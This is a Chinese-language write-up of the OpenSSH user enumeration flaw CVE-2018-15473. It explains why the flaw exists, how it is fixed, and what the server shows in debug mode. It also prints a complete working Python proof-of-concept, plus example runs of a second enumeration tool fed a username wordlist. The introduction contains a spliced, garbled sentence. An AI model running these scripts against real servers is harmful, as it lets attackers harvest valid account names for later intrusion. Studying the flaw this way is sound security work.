<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-15473openssh-用户枚举漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-15473</span><span class="csECDA2D3">）</span><span class="csDE05BCC">OpenSSH </span><span class="csECDA2D3">用户枚举漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">（</span><span class="cs8926E06">OpenBSD</span><span class="cs9C1B1871">安全外壳）是</span><span class="cs8926E06">OpenBSD</span><span class="cs9C1B1871">计划组的一套用于安全访问远程计算机的连接工具。该工具是</span><span class="cs8926E06">SSH</span><span class="cs9C1B1871">协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级</span><span class="cs8926E06">OpenSSH 7.7</span><span class="cs9C1B1871">及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件敏感信息。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">OpenSSH &lt; 7.7</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个漏洞存在于</span><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">所实现的一些认证功能之中，首先我们一起看一看</span><span class="cs8926E06">Ubuntu OpenSSH</span><span class="cs9C1B1871">的公共密钥认证漏洞。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过向一台</span><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">服务器发送恶意的公共密钥认证消息，攻击者将能够获取特定的用户名信息。如果用户不存在，服务器将会向客户端发送认证失败的消息。如果用户存在，消息将无法解析并终止通信，即通信连接会在没有任何消息回传的情况下断开。关于该漏洞的漏洞利用代码可以从这个</span><span class="cs8926E06">Python PoC</span><span class="cs9C1B1871">脚本中获取：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">pip2 install --upgrade paramiko==2.4.1</span></p><p class="cs6FD73CFB"><span class="cs8926E06">pip2 install paramiko</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Copyright (c) 2018 Matthew Daley</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Permission is hereby granted, free of charge, to any person obtaining a copy</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># of this software and associated documentation files (the &quot;Software&quot;), to</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># deal in the Software without restriction, including without limitation the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># sell copies of the Software, and to permit persons to whom the Software is</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># furnished to do so, subject to the following conditions:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># The above copyright notice and this permission notice shall be included in</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># all copies or substantial portions of the Software.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># IN THE SOFTWARE.</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import logging</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import paramiko</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import socket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class InvalidUsername(Exception):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def add_boolean(*args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paramiko.common.MSG_SERVICE_ACCEPT]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def service_accept(*args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;paramiko.message.Message.add_boolean = add_boolean</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return old_service_accept(*args, **kwargs)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def userauth_failure(*args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise InvalidUsername()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">paramiko.auth_handler.AuthHandler._handler_table.update({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">logging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">arg_parser = argparse.ArgumentParser()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">arg_parser.add_argument(&#39;hostname&#39;, type=str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">arg_parser.add_argument(&#39;--port&#39;, type=int, default=22)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">arg_parser.add_argument(&#39;username&#39;, type=str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">args = arg_parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">sock = socket.socket()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sock.connect((args.hostname, args.port))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">except socket.error:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[-] Failed to connect&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">transport = paramiko.transport.Transport(sock)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;transport.start_client()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">except paramiko.ssh_exception.SSHException:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[-] Failed to negotiate SSH transport&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(2)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">except InvalidUsername:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[*] Invalid username&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">except paramiko.ssh_exception.AuthenticationException:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] Valid username&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个漏洞之所以存在，是因为服务器在对消息完整解析之前，用户查询了不存在的用户名。想要修复该漏洞也很简单，按攻击逻辑反着来就行了：首先对消息进行完整解析，然后再建立通信连接。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试漏洞利用</span><span class="cs8926E06">PoC</span><span class="cs9C1B1871">的一种方法就是在调试模式下开启</span><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">服务器：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="423" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后用已存在的有效用户名运行</span><span class="cs8926E06">PoC</span><span class="cs9C1B1871">脚本：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="195" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在服务器端将会查看到错误提示：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="423" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">相关错误信息还可以在</span><span class="cs8926E06">/var/log/auth.log</span><span class="cs9C1B1871">中找到：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="68" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果无法正确解析消息，会导致客户端跟服务器端之间的通信中断，而且中断时不会收到服务器发送的提示信息：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="736" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意粉红色标记的最后一个数据包（客户端数据包），这里没有后续的蓝色数据包（服务器数据包）。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06">PoC</span><span class="cs9C1B1871">脚本以不存在的用户名运行之后：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="179" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不会弹出</span><span class="cs8926E06">&ldquo;imcomplete message&rdquo;</span><span class="cs9C1B1871">错误提示：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="423" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="736" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意通信数据结尾处的蓝色服务器数据包。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这就是该漏洞（公共密钥认证漏洞）暴露有效用户名的整个流程了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中，</span><span class="cs8926E06">userauth_pubkey</span><span class="cs9C1B1871">函数是认证功能所实现的其中一个函数，专门用于根据公共密钥来完成身份验证。如果认证失败，则返回</span><span class="cs8926E06">&ldquo;0&rdquo;</span><span class="cs9C1B1871">，成功则返回</span><span class="cs8926E06">&ldquo;1&rdquo;</span><span class="cs9C1B1871">。当服务器端接收到了</span><span class="cs8926E06">SSH2_MSG_USERAUTH_REQUEST</span><span class="cs9C1B1871">请求后，便会调用该函数，之后的结果会用来给客户端回传</span><span class="cs8926E06">SSH2_MSG_USERAUTH_FAILURE</span><span class="cs9C1B1871">或</span><span class="cs8926E06">SSH2_MSG_USERAUTH_SUCCESS</span><span class="cs9C1B1871">消息。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="502" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该函数的运行逻辑为：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">\1. </span><span class="cs9C1B1871">如果用户名不存在：返回</span><span class="cs8926E06">&ldquo;0&rdquo;</span><span class="cs9C1B1871">；</span></p><p class="cs6FD73CFB"><span class="cs8926E06">\2. </span><span class="cs9C1B1871">如果用户名存在但密钥错误：返回</span><span class="cs8926E06">&ldquo;0&rdquo;</span><span class="cs9C1B1871">；</span></p><p class="cs6FD73CFB"><span class="cs8926E06">\3. </span><span class="cs9C1B1871">如果用户名存在且密钥正确：返回</span><span class="cs8926E06">&ldquo;1&rdquo;</span><span class="cs9C1B1871">；</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是有人发现，我们竟然可以在第一步和第二步中间终止</span><span class="cs8926E06">userauth_pubkey</span><span class="cs9C1B1871">函数的运行。第一步执行完后，</span><span class="cs8926E06">userauth_pubkey</span><span class="cs9C1B1871">函数会从客户端获取消息字符串，如果获取失败（恶意字符串导致），整个过程都会终止，并在不发送任何回传消息的情况下关闭连接。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">packet_get_string</span><span class="cs9C1B1871">所导致的情况如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="502" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果用户名存在，第一步会在程序从消息域中提取完数据后进行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第一个提取的数据域是一个布尔值（</span><span class="cs8926E06">1</span><span class="cs9C1B1871">字节），对应函数为</span><span class="cs8926E06">packet_get_char()</span><span class="cs9C1B1871">。如果认证类型为</span><span class="cs8926E06">publickey</span><span class="cs9C1B1871">，返回值就是</span><span class="cs8926E06">&ldquo;1&rdquo;</span><span class="cs9C1B1871">。后续跟着的是两个字符串：算法和密钥。在</span><span class="cs8926E06">SSH</span><span class="cs9C1B1871">消息中，字符串会以一个</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">长度</span><span class="cs8926E06">-</span><span class="cs9C1B1871">值</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">键值对进行编码，一个字符串为</span><span class="cs8926E06">4</span><span class="cs9C1B1871">个字节。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">函数</span><span class="cs8926E06">packet_get_string</span><span class="cs9C1B1871">可以从消息中提取字符串，并对其进行验证，这个函数还需要依赖另一个函数：</span><span class="cs8926E06">ssh_ssh_packet_get_string</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="60" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">ssh_packet_get_string</span><span class="cs9C1B1871">函数会调用</span><span class="cs8926E06">sshpkt_get_string</span><span class="cs9C1B1871">函数，如果返回的值不是</span><span class="cs8926E06">&ldquo;0&rdquo;</span><span class="cs9C1B1871">，它还会调用</span><span class="cs8926E06">fatal</span><span class="cs9C1B1871">函数。函数</span><span class="cs8926E06">fatal</span><span class="cs9C1B1871">会记录致命的错误事件，然后终止生成的</span><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">进程（不回传任何错误信息）。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="240" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来会执行</span><span class="cs8926E06">sshpkt_get_string</span><span class="cs9C1B1871">函数并调用</span><span class="cs8926E06">sshbuf_get_string</span><span class="cs9C1B1871">函数：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="83" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后</span><span class="cs8926E06">sshbuf_get_string</span><span class="cs9C1B1871">函数会调用</span><span class="cs8926E06">sshbuf_get_string_direct</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="416" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后</span><span class="cs8926E06">sshbuf_get_string_direct</span><span class="cs9C1B1871">会调用</span><span class="cs8926E06">sshbuf_peek_string_direct:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image14.png" width="560" height="343" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后，</span><span class="cs8926E06">sshbuf_peek_string_direct</span><span class="cs9C1B1871">会进行字符串验证：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image15.png" width="560" height="432" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果消息中剩余数据小于</span><span class="cs8926E06">4</span><span class="cs9C1B1871">字节，或者说消息中的剩余数据小于字符串长度，则会返回</span><span class="cs8926E06">SSH_ERR_MESSAGE_INCOMPLETE </span><span class="cs9C1B1871">错误消息。这就是我们之前那个</span><span class="cs8926E06">Python PoC</span><span class="cs9C1B1871">脚本所要触发的东西。首先，它会跟</span><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">服务器建立一条加密的通信链接，然后向其发送恶意的</span><span class="cs8926E06">SSH2_MSG_USERAUTH_REQUEST</span><span class="cs9C1B1871">消息。通过重定义</span><span class="cs8926E06">add_boolean</span><span class="cs9C1B1871">函数，消息中的布尔值域会被忽略。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当函数</span><span class="cs8926E06">userauth_pubkey</span><span class="cs9C1B1871">解析了恶意消息之后，首先会读取布尔值域，由于这个域其实是不存在的，因此读取的会是下一个域（函数</span><span class="cs8926E06">packet_get_char</span><span class="cs9C1B1871">）：加密算法字符串的</span><span class="cs8926E06">4</span><span class="cs9C1B1871">字节长度值。然后调用下一个函数</span><span class="cs8926E06">packet_get_string</span><span class="cs9C1B1871">来读取加密算法字符串。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下面是解析合法消息的过程：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image16.png" width="560" height="479" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下面是解析恶意消息的过程：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OpenSSH/%ef%bc%88CVE-2018-15473%ef%bc%89OpenSSH%20%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be%e6%bc%8f%e6%b4%9e_files/image17.png" width="560" height="582" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">结果就是，代码解析了一个</span><span class="cs8926E06">1907</span><span class="cs9C1B1871">字节的字符串（十六进制为</span><span class="cs8926E06">0&times;00000773</span><span class="cs9C1B1871">），这比整个消息的长度还要长，这会导致</span><span class="cs8926E06">ssh_packet_get_string</span><span class="cs9C1B1871">调用</span><span class="cs8926E06">fatal</span><span class="cs9C1B1871">函数，并中断</span><span class="cs8926E06">OpenSSH</span><span class="cs9C1B1871">进程。</span></p><h3 class="cs868C439D">
			<a name="poc补充"><span class="csD1E291E2">poc</span><span class="csD6CA00D2">补充</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">不知道为什么上面那个</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">运行就报错了。这里找了一个能用的</span><span class="cs8926E06">poc</span></p><h2 class="cs868C439D">
			<a name="examples"><span class="csB2D98684">Examples</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">A single username</span></p><p class="cs3A447A38"><span class="cs9FB05234">(cve-2018-15473)─&gt; ./ssh-username-enum.py -u epi 192.168.1.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] epi found!</span></p><p class="cs6FD73CFB"><span class="cs8926E06">Use a wordlist with 10 threads (the default is 4)</span></p><p class="cs3A447A38"><span class="cs9FB05234">(cve-2018-15473)─&gt; ./ssh-username-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.1.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] avahi found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] avahi-autoipd found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] backup found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] daemon found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] bin found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------8&lt;------</span></p><p class="cs6FD73CFB"><span class="cs8926E06">IPv6 Address on port 2222 and INCREASED VERBOSITY!</span></p><p class="cs3A447A38"><span class="cs9FB05234">(cve-2018-15473)─&gt; ./ssh-username-enum.py -6 -p 2222 -v -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt &#39;::1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] 4Dgifts not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] demo not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] checkfs not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] anon not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] EZsetup not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] auditor not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] demos not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] OutOfBox not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] checkfsys not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] avahi found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] diag not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] ROOT not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] checksys not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] cmwlogin not found</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] avahi-autoipd found!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------8&lt;------</span></p><p class="cs6FD73CFB"><span class="cs5BEC2C28">requirements.txt</span></p><p class="cs6FD73CFB"><span class="cs8926E06">asn1crypto==0.24.0<br/>bcrypt==3.1.4<br/>cffi==1.11.5<br/>cryptography==2.3.1<br/>idna==2.7<br/>paramiko==2.4.1<br/>pyasn1==0.4.4<br/>pycparser==2.18<br/>PyNaCl==1.2.1<br/>six==1.11.0</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">derived from work done by Matthew Daley</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https://bugfuzz.com/stuff/ssh-check-username.py</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">props to Justin Gardner for the add_boolean workaround</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CVE-2018-15473</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">--------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invalid authenticating user until after the packet containing the request has been fully parsed, related to</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Author: epi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 